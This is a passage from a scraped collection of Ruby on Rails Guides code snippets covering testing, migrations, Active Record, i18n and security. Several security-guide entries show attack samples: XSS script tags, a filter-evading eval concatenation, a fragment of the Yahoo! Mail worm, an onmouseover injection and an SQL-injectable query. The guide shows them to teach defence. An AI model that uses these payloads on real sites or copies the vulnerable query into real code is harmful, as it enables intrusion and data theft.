https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n# Running:\n\n.\n\nFinished in 0.027476s, 36.3952 runs/s, 36.3952 assertions/s.\n\n1 runs, 1 assertions, 0 failures, 0 errors, 0 skips\n```\n\n----------------------------------------\n\nTITLE: Connecting to a Remote Browser (Ruby)\nDESCRIPTION: This snippet demonstrates how to configure system tests to connect to a remote browser, such as Headless Chrome in Docker. It uses the `SELENIUM_REMOTE_URL` environment variable to define the remote URL and sets the `browser` option to `:remote` within the `options` hash passed to `driven_by`. Requires the selenium-webdriver gem.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_63\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ApplicationSystemTestCase < ActionDispatch::SystemTestCase\n  url = ENV.fetch(\"SELENIUM_REMOTE_URL\", nil)\n  options = if url\n    { browser: :remote, url: url }\n  else\n    { browser: :chrome }\n  end\n  driven_by :selenium, using: :headless_chrome, options: options\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Rails API Documentation with RDoc\nDESCRIPTION: Shows how to generate the Rails API documentation using RDoc through a bundle command. The generated HTML files will be placed in the ./doc/rdoc directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake rdoc\n```\n\n----------------------------------------\n\nTITLE: RedCloth HTML filter bypass demonstration\nDESCRIPTION: A Ruby example showing how RedCloth, a Textile markup processor, can be vulnerable to XSS if not properly configured. This demonstrates the default behavior without filtering.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\nRedCloth.new(\"<script>alert(1)</script>\").to_html\n# => \"<script>alert(1)</script>\"\n```\n\n----------------------------------------\n\nTITLE: Using HAVING Clause with Active Record Find\nDESCRIPTION: Shows how to use the :having option with find for filtering records in grouped queries, particularly useful for aggregate conditions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\ndevelopers = Developer.find(:all, :group => \"salary\",\n  :having => \"sum(salary) > 10000\", :select => \"salary\")\n```\n\n----------------------------------------\n\nTITLE: YAML Fixture - Articles\nDESCRIPTION: YAML fixture for Articles, defining one fixture named 'first' with a title.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_28\n\nLANGUAGE: yaml\nCODE:\n```\n# test/fixtures/articles.yml\nfirst:\n  title: An Article\n```\n\n----------------------------------------\n\nTITLE: Stream from a Chat Channel Ruby\nDESCRIPTION: This Ruby code defines a ChatChannel that streams from a broadcasting based on the room parameter. It uses the stream_from method in the subscribed callback to subscribe to a channel named \"chat_#{params[:room]}\".\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_12\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/chat_channel.rb\nclass ChatChannel < ApplicationCable::Channel\n  def subscribed\n    stream_from \"chat_#{params[:room]}\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Pirate Time Format Configuration\nDESCRIPTION: YAML configuration for the 'pirate' locale time format, demonstrating how to customize date/time formats for different locales.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\n# config/locales/pirate.yml\npirate:\n  time:\n    formats:\n      short: \"arrrround %H'ish\"\n```\n\n----------------------------------------\n\nTITLE: Creating Table with Composite Primary Key (Ruby)\nDESCRIPTION: This migration demonstrates how to create a `users` table with a composite primary key using an array for the `:primary_key` option. In this example, the primary key is composed of `id` and `name`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_32\n\nLANGUAGE: Ruby\nCODE:\n```\nclass CreateUsers < ActiveRecord::Migration[8.1]\n  def change\n    create_table :users, primary_key: [:id, :name] do |t|\n      t.string :name\n      t.string :email\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using TimeWithZone's xmlschema Method with Fractional Seconds in Ruby on Rails\nDESCRIPTION: This code shows how to use the xmlschema method with TimeWithZone to generate XML-friendly time strings with specified precision for fractional seconds. The example returns the current time in the configured time zone with 6 digits of precision in the fractional second part.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nTime.zone.now.xmlschema(6) # => \"2009-01-16T13:00:06.13653Z\"\n```\n\n----------------------------------------\n\nTITLE: Basic UserMailer Class Definition in Ruby\nDESCRIPTION: Defines a basic UserMailer class that inherits from ApplicationMailer, which is the base class for all mailers in a Rails application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n# app/mailers/user_mailer.rb\nclass UserMailer < ApplicationMailer\nend\n```\n\n----------------------------------------\n\nTITLE: Setting a default value for cattr_accessor with a block\nDESCRIPTION: This Ruby code demonstrates the use of `cattr_accessor` with a block to assign a default value to the class-level attribute. It initializes the class variable and generates the corresponding class methods with the default value set to `true`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nclass MysqlAdapter < AbstractAdapter\n  # Generates class methods to access @@emulate_booleans with default value of true.\n  cattr_accessor :emulate_booleans, default: true\nend\n```\n\n----------------------------------------\n\nTITLE: Generated JSON Example (JSON)\nDESCRIPTION: This JSON shows the output that would be produced by the Jbuilder example code. It defines a simple JSON object with name and email properties.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"name\": \"Alex\",\n  \"email\": \"alex@example.com\"\n}\n```\n\n----------------------------------------\n\nTITLE: Cleaning Up Active Storage Fixtures in Serial Tests\nDESCRIPTION: Example showing how to remove fixture files after all tests when not using parallel testing, using Minitest.after_run.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_82\n\nLANGUAGE: ruby\nCODE:\n```\n# test_helper.rb\n\nMinitest.after_run do\n  FileUtils.rm_rf(ActiveStorage::Blob.services.fetch(:test_fixtures).root)\nend\n```\n\n----------------------------------------\n\nTITLE: Setting Encryption Context for a Code Block - Ruby\nDESCRIPTION: Shows how to temporarily set a custom encryption context for all encryption operations performed within a given block in Rails Active Record Encryption. The example sets a NullEncryptor for the duration of the block. Expects a hash of context options and a block; restores global context after execution.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nActiveRecord::Encryption.with_encryption_context(encryptor: ActiveRecord::Encryption::NullEncryptor.new) do\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Reporting Errors (Ruby)\nDESCRIPTION: This test case demonstrates how an error is reported during testing. It introduces an undefined variable, which will cause an exception during the test execution. The `assert true` line is never reached due to the error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_12\n\nLANGUAGE: Ruby\nCODE:\n```\ntest \"should report error\" do\n  # some_undefined_variable is not defined elsewhere in the test case\n  some_undefined_variable\n  assert true\nend\n```\n\n----------------------------------------\n\nTITLE: Ordering from Joined Table in Rails\nDESCRIPTION: Demonstrates ordering results from a joined table using `includes` to load the associated records. This allows ordering based on attributes of the associated model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_83\n\nLANGUAGE: ruby\nCODE:\n```\nBook.includes(:author).order(books: { print_year: :desc }, authors: { name: :asc })\n# OR\nBook.includes(:author).order(\"books.print_year desc\", \"authors.name asc\")\n```\n\n----------------------------------------\n\nTITLE: Setting Request Variant in Rails Controller\nDESCRIPTION: This code snippet shows how to determine and set the request variant within a controller action. The variant can then be used to render different templates.  The example demonstrates a simple case where the variant is set based on a session variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\ndef index\n  request.variant = determine_variant\nend\n\nprivate\n  def determine_variant\n    variant = nil\n    # some code to determine the variant(s) to use\n    variant = :mobile if session[:use_mobile]\n\n    variant\n  end\n```\n\n----------------------------------------\n\nTITLE: Custom Browser Version Control in Rails Controller\nDESCRIPTION: Example of specifying custom browser version requirements for specific controller actions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass MessagesController < ApplicationController\n  # In addition to the browsers blocked by ApplicationController, also block Opera below 104 and Chrome below 119 for the show action.\n  allow_browser versions: { opera: 104, chrome: 119 }, only: :show\nend\n```\n\n----------------------------------------\n\nTITLE: Using a Block with `before_action` in Rails\nDESCRIPTION: This snippet illustrates how to define a `before_action` callback using a block. The block receives the controller as an argument, allowing access to controller methods. Note that `send` is used to call private methods.  This approach is less common but can be useful in simpler cases.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  before_action do |controller|\n    unless controller.send(:logged_in?)\n      flash[:error] = \"You must be logged in to access this section\"\n      redirect_to new_login_url\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Unified Rendering in Action Controller\nDESCRIPTION: Demonstrates the simplified rendering syntax in Rails 2.3, which intelligently determines the render type based on the path format.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nrender '/tmp/random_file.erb'\nrender 'other_controller/action'\nrender 'show'\nrender :show\n```\n\n----------------------------------------\n\nTITLE: Creating a Dummy Test Database - Rails CLI - Bash\nDESCRIPTION: Changes into the test/dummy app directory and runs the Rails db:create command to set up the development test database. This is necessary for running plugin integration tests using the dummy app. Relies on a valid Rails application structure under test/dummy.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ cd test/dummy\n$ bin/rails db:create\n```\n\n----------------------------------------\n\nTITLE: Running Active Record Tests for MySQL (mysql2) in Bash\nDESCRIPTION: Executes the Active Record test suite specifically using the `mysql2` adapter via the `test:mysql2` Rake task. Requires the MySQL test database to be built first.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_25\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake test:mysql2\n```\n\n----------------------------------------\n\nTITLE: Updated Gemfile configuration for Rails 4.0\nDESCRIPTION: Shows the updated Bundler.require syntax in application.rb for Rails 4.0, which removes the assets group and uses Rails.groups instead.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_87\n\nLANGUAGE: ruby\nCODE:\n```\n# Require the gems listed in Gemfile, including any gems\n# you've limited to :test, :development, or :production.\nBundler.require(*Rails.groups)\n```\n\n----------------------------------------\n\nTITLE: Checking for Existence of Associated Object via nil? - Ruby\nDESCRIPTION: Checks if a Book's associated Author exists by calling .nil? on the association. If no author is found, assigns a message to @msg. This is a typical Rails pattern for conditional logic based on association presence.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nif @book.author.nil?\\n  @msg = \\\"No author found for this book\\\"\\nend\n```\n\n----------------------------------------\n\nTITLE: Formatting Numbers as Delimited Strings in Ruby\nDESCRIPTION: This shows how to format numbers with delimiters using the `to_fs(:delimited)` method, including options for delimiter and separator. This is part of ActiveSupport core extensions to the Numeric class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_101\n\nLANGUAGE: ruby\nCODE:\n```\n12345678.to_fs(:delimited)                     # => 12,345,678\n12345678.05.to_fs(:delimited)                  # => 12,345,678.05\n12345678.to_fs(:delimited, delimiter: \".\")     # => 12.345.678\n12345678.to_fs(:delimited, delimiter: \",\")     # => 12,345,678\n12345678.05.to_fs(:delimited, separator: \" \")  # => 12,345,678 05\n```\n\n----------------------------------------\n\nTITLE: String concatenation to bypass JavaScript filters\nDESCRIPTION: A JavaScript technique using string concatenation to evade keyword filtering. This example shows how attackers can bypass filters by breaking up restricted words.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_50\n\nLANGUAGE: javascript\nCODE:\n```\nalert(eval('document.body.inne' + 'rHTML'));\n```\n\n----------------------------------------\n\nTITLE: Original ApplicationController Template - Ruby\nDESCRIPTION: This is the default base application controller inheriting from ActionController::Base. In API-only applications, this should be switched to inherit from ActionController::API for a leaner stack.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Rails Documentation Guides Locally\nDESCRIPTION: Command to generate Rails guides documentation locally within an application, placing them in the Rails.root/doc/guides directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rake doc:guides\n```\n\n----------------------------------------\n\nTITLE: Defining Delegated Methods with Prefixes in Ruby on Rails\nDESCRIPTION: Shows how to use the delegate method with prefixes in Active Support. This allows for cleaner method delegation between related objects, with customizable method prefixes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_11\n\nLANGUAGE: Ruby\nCODE:\n```\nclass Vendor < ActiveRecord::Base\n  has_one :account\n  delegate :email, :password, :to => :account, :prefix => true\nend\n```\n\nLANGUAGE: Ruby\nCODE:\n```\nclass Vendor < ActiveRecord::Base\n  has_one :account\n  delegate :email, :password, :to => :account, :prefix => :owner\nend\n```\n\n----------------------------------------\n\nTITLE: Cloning the Ruby on Rails Repository\nDESCRIPTION: Commands to clone the Ruby on Rails GitHub repository and navigate to the project directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ git clone https://github.com/rails/rails.git\n$ cd rails\n```\n\n----------------------------------------\n\nTITLE: Change Directory to Rails App\nDESCRIPTION: This command changes the current directory to the newly created Rails application directory named 'store'. This is necessary to execute further commands within the context of the Rails application. The 'store' directory must exist in the current location.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ cd store\n```\n\n----------------------------------------\n\nTITLE: Yahoo! Mail worm XSS exploit code\nDESCRIPTION: A real-world example of a JavaScript-based XSS worm that targeted Yahoo! Mail. This demonstrates how attackers exploited HTML/JavaScript filtering vulnerabilities in webmail systems.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_47\n\nLANGUAGE: html\nCODE:\n```\n<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'\n  target=\"\"onload=\"var http_request = false;    var Email = '';\n  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...\n```\n\n----------------------------------------\n\nTITLE: String Access at Position\nDESCRIPTION: This snippet shows how to access a character at a specific position in a string using the `at` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\n\"hello\".at(0)  # => \"h\"\n\"hello\".at(4)  # => \"o\"\n\"hello\".at(-1) # => \"o\"\n\"hello\".at(10) # => nil\n```\n\n----------------------------------------\n\nTITLE: New assert_select Match Syntax\nDESCRIPTION: Shows the new CSS-like :match selector syntax for assert_select.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nassert_select \":match('id', ?)\", 'comment_1'\n```\n\n----------------------------------------\n\nTITLE: Limiting Guide Generation to a Single File - Bash\nDESCRIPTION: Sequence of bash commands for creating a new guide file and invoking the generator for only that file using the ONLY environment variable. Requires Bash shell and Ruby/Bundler setup. Input is a guide filename; output is that guide's HTML only.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\n$ touch my_guide.md\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake guides:generate ONLY=my_guide\n```\n\n----------------------------------------\n\nTITLE: Setting Action Mailer defaults in Rails 3\nDESCRIPTION: Example showing the new syntax for setting default values in Action Mailer, replacing the deprecated individual settings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nActionMailer.default :key => value\n```\n\n----------------------------------------\n\nTITLE: Configuring production database.yml for Solid Queue\nDESCRIPTION: This code configures the `database.yml` file to include a separate database connection for the `queue` database in the production environment. This allows Solid Queue to store job data in a separate database from the primary application data. The storage directory is mounted as a persistent Docker volume in `config/deploy.yml`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\n# config/database.yml\n# Store production database in the storage/ directory, which by default\n# is mounted as a persistent Docker volume in config/deploy.yml.\nproduction:\n  primary:\n    <<: *default\n    database: storage/production.sqlite3\n  queue:\n    <<: *default\n    database: storage/production_queue.sqlite3\n    migrations_paths: db/queue_migrate\n```\n\n----------------------------------------\n\nTITLE: Using Acronyms with Camelize\nDESCRIPTION: This snippet shows how to define acronyms using `ActiveSupport::Inflector.inflections` to correctly camelize strings containing acronyms. This prevents acronyms from being incorrectly converted to lower case.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Inflector.inflections do |inflect|\n  inflect.acronym \"SSL\"\nend\n\n\"SSLError\".underscore.camelize # => \"SSLError\"\n```\n\n----------------------------------------\n\nTITLE: Date calculations with beginning_of_quarter and end_of_quarter in Ruby\nDESCRIPTION: These methods return the dates for the beginning and end of the quarter of the receiver's calendar year.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_146\n\nLANGUAGE: ruby\nCODE:\n```\nd = Date.new(2010, 5, 9) # => Sun, 09 May 2010\nd.beginning_of_quarter   # => Thu, 01 Apr 2010\nd.end_of_quarter         # => Wed, 30 Jun 2010\n```\n\n----------------------------------------\n\nTITLE: Validation Usage in Interactive Ruby Console\nDESCRIPTION: Shows how to check object validity using the valid? method in IRB console.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nirb> Person.new(name: \"John Doe\").valid?\n=> true\nirb> Person.new(name: nil).valid?\n=> false\n```\n\n----------------------------------------\n\nTITLE: Default API URL (No Release Tag) - none\nDESCRIPTION: Provides an example of an API URL without a release tag, used to show how the docs generator rewrites links based on environment. The snippet informs readers about version-injection mechanics. No execution or parsing occurs; it's an example for documentation authors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_7\n\nLANGUAGE: none\nCODE:\n```\nhttps://api.rubyonrails.org/classes/ActionDispatch/Response.html\n```\n\n----------------------------------------\n\nTITLE: ActiveRecord Model Definition\nDESCRIPTION: Defines the Customer model with has_many associations to Order and Review models. This demonstrates a basic model definition with standard has_many relationships.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nclass Customer < ApplicationRecord\n  has_many :orders\n  has_many :reviews\nend\n```\n\n----------------------------------------\n\nTITLE: Pluralize String\nDESCRIPTION: This snippet demonstrates pluralizing a string using the `pluralize` method. It handles irregular plurals and uncountable nouns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_63\n\nLANGUAGE: ruby\nCODE:\n```\n\"table\".pluralize     # => \"tables\"\n\"ruby\".pluralize      # => \"rubies\"\n\"equipment\".pluralize # => \"equipment\"\n```\n\n----------------------------------------\n\nTITLE: Verifying File Changes After Authentication Generation (Git Status Output)\nDESCRIPTION: Lists the files modified (`Gemfile`, `Gemfile.lock`, `ApplicationController`, `routes.rb`) and untracked (newly created controllers, models, views, mailers, migrations, etc.) after running the Rails authentication generator. This output, resembling `git status`, helps developers track the changes introduced by the generator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nOn branch main\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git restore <file>...\" to discard changes in working directory)\n  modified:   Gemfile\n  modified:   Gemfile.lock\n  modified:   app/controllers/application_controller.rb\n  modified:   config/routes.rb\n\nUntracked files:\n  (use \"git add <file>...\" to include in what will be committed)\n  app/controllers/concerns/authentication.rb\n  app/controllers/passwords_controller.rb\n  app/controllers/sessions_controller.rb\n  app/mailers/passwords_mailer.rb\n  app/models/current.rb\n  app/models/session.rb\n  app/models/user.rb\n  app/views/passwords/\n  app/views/passwords_mailer/\n  app/views/sessions/\n  db/migrate/\n  db/schema.rb\n  test/mailers/previews/\n```\n\n----------------------------------------\n\nTITLE: Database Warning Allowlist Configuration in Ruby\nDESCRIPTION: This code shows how to define an allowlist of warning codes and messages that will be ignored by Active Record, regardless of the `db_warnings_action` configuration. Strings and Regular Expressions are used to define this allowlist. In the example, any warnings that match the defined regular expression or exact warning messages, including the MySQL error code 1062, are ignored and not raised as exceptions even if `config.active_record.db_warnings_action` is set to `:raise`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.db_warnings_action = :raise\n# The following warnings will not be raised\nconfig.active_record.db_warnings_ignore = [\n  /Invalid utf8mb4 character string/,\n  \"An exact warning message\",\n  \"1062\", # MySQL Error 1062: Duplicate entry\n]\n```\n\n----------------------------------------\n\nTITLE: English Locale File Example - YAML\nDESCRIPTION: This YAML snippet shows an example of an English locale file (en.yml) with a simple translation for the \"hello\" key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_88\n\nLANGUAGE: yaml\nCODE:\n```\nen:\n  hello: \"Hello world\"\n```\n\n----------------------------------------\n\nTITLE: Vulnerable SQL Query in Rails\nDESCRIPTION: Example of an unsafe SQL query that is vulnerable to SQL injection by directly interpolating user input into the query string.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nProject.where(\"name = '#{params[:name]}'\")\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies on Ubuntu\nDESCRIPTION: Commands to install all required dependencies including databases, Node.js, and Yarn on Ubuntu. Includes SQLite, MySQL, PostgreSQL, Redis, and other services and libraries needed for Rails development.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo apt-get update\n$ sudo apt-get install sqlite3 libsqlite3-dev mysql-server libmysqlclient-dev postgresql postgresql-client postgresql-contrib libpq-dev redis-server memcached imagemagick ffmpeg mupdf mupdf-tools libxml2-dev libvips42 poppler-utils libyaml-dev libffi-dev\n\n# Install Yarn\n# Use this command if you do not have Node.js installed\n# ref: https://github.com/nodesource/distributions#installation-instructions\n$ sudo mkdir -p /etc/apt/keyrings\n$ curl --fail --silent --show-error --location https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg\n$ echo \"deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_20.x nodistro main\" | sudo tee /etc/apt/sources.list.d/nodesource.list\n$ sudo apt-get update\n$ sudo apt-get install -y nodejs\n\n# Once you have installed Node.js, install the yarn npm package\n$ sudo npm install --global yarn\n```\n\n----------------------------------------\n\nTITLE: Wildcard Segments (Ruby)\nDESCRIPTION: Defines a route with a wildcard segment (`*other`) that captures the remaining part of the path.  This allows matching paths with variable length segments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\nget \"photos/*other\", to: \"photos#unknown\"\n```\n\n----------------------------------------\n\nTITLE: Malicious Code in Image Onmouseover Event\nDESCRIPTION: This snippet shows how an attacker can embed malicious code in an image's onmouseover event handler. When users hover over the image, the hidden code executes, potentially triggering unwanted actions or stealing data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_14\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"http://www.harmless.com/img\" width=\"400\" height=\"400\" onmouseover=\"...\" />\n```\n\n----------------------------------------\n\nTITLE: Extracting Values with pluck in Ruby\nDESCRIPTION: This demonstrates the `pluck` method which extracts the given key from each element in the enumerable. Defined in `active_support/core_ext/enumerable.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_116\n\nLANGUAGE: ruby\nCODE:\n```\n[{ name: \"David\" }, { name: \"Rafael\" }, { name: \"Aaron\" }].pluck(:name) # => [\"David\", \"Rafael\", \"Aaron\"]\n[{ id: 1, name: \"David\" }, { id: 2, name: \"Rafael\" }].pluck(:id, :name) # => [[1, \"David\"], [2, \"Rafael\"]]\n```\n\n----------------------------------------\n\nTITLE: Cache Key Example in Rails\nDESCRIPTION: Shows the format of a typical Rails cache key generated for fragment caching.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_45\n\nLANGUAGE: irb\nCODE:\n```\nviews/articles/index:bea67108094918eeba32cd4a6f786301/articles/1\n```\n\n----------------------------------------\n\nTITLE: Switching Shards and Roles Manually in Sharded Models - ActiveRecord - Ruby\nDESCRIPTION: This Ruby snippet shows how to use 'ShardRecord.connected_to' with 'role' and 'shard' keys to target operations on a specific shard and role. Dependencies are sharding-enabled Rails configurations and the ShardRecord setup; block inputs are ActiveRecord operations, and outputs affect only the targeted shard. This approach is crucial for isolated tenant data management.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nShardRecord.connected_to(role: :writing, shard: :shard_one) do\n  @person = Person.create! # Creates a record in shard shard_one\nend\n\nShardRecord.connected_to(role: :writing, shard: :shard_two) do\n  Person.find(@person.id) # Can't find record, doesn't exist because it was created\n                   # in the shard named \":shard_one\".\nend\n```\n\n----------------------------------------\n\nTITLE: Updated XHR Test Syntax for CSRF Protection\nDESCRIPTION: Example showing the updated syntax for XHR tests after protect_from_forgery changes to prevent cross-origin script tags\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nxhr :get, :foo, format: :js\n```\n\n----------------------------------------\n\nTITLE: Creating a branch for your contribution\nDESCRIPTION: Commands to navigate to the Rails directory and create a new branch for your contribution.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ cd rails\n$ git checkout -b my_new_branch\n```\n\n----------------------------------------\n\nTITLE: Example Cache Delete Matched Payload in ActiveSupport\nDESCRIPTION: Example of a payload structure for cache_delete_matched.active_support event which is used when deleting cache entries using a pattern, only available in certain cache stores.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: \"posts/*\",\n  store: \"ActiveSupport::Cache::RedisCacheStore\"\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing has_and_belongs_to_many Association in Ruby on Rails\nDESCRIPTION: Shows how to create a direct many-to-many relationship between Assembly and Part models without an intermediary model. This approach is simpler but doesn't allow for additional attributes on the join table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_63\n\nLANGUAGE: ruby\nCODE:\n```\nclass Assembly < ApplicationRecord\n  has_and_belongs_to_many :parts\nend\n\nclass Part < ApplicationRecord\n  has_and_belongs_to_many :assemblies\nend\n```\n\n----------------------------------------\n\nTITLE: Parameterizing Strings\nDESCRIPTION: Shows the `parameterize` method, which normalizes a string to be used in URLs, replacing spaces with dashes by default. It allows preserving case and using custom separators.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_79\n\nLANGUAGE: ruby\nCODE:\n```\n\"John Smith\".parameterize # => \"john-smith\"\n\"Kurt Gödel\".parameterize # => \"kurt-godel\"\n\n\"John Smith\".parameterize(preserve_case: true) # => \"John-Smith\"\n\"Kurt Gödel\".parameterize(separator: \"_\") # => \"kurt_godel\"\n```\n\n----------------------------------------\n\nTITLE: HTTP Response Headers\nDESCRIPTION: These are example HTTP response headers. They are not code snippets, but rather demonstrations of the output generated by the head requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_52\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 400 Bad 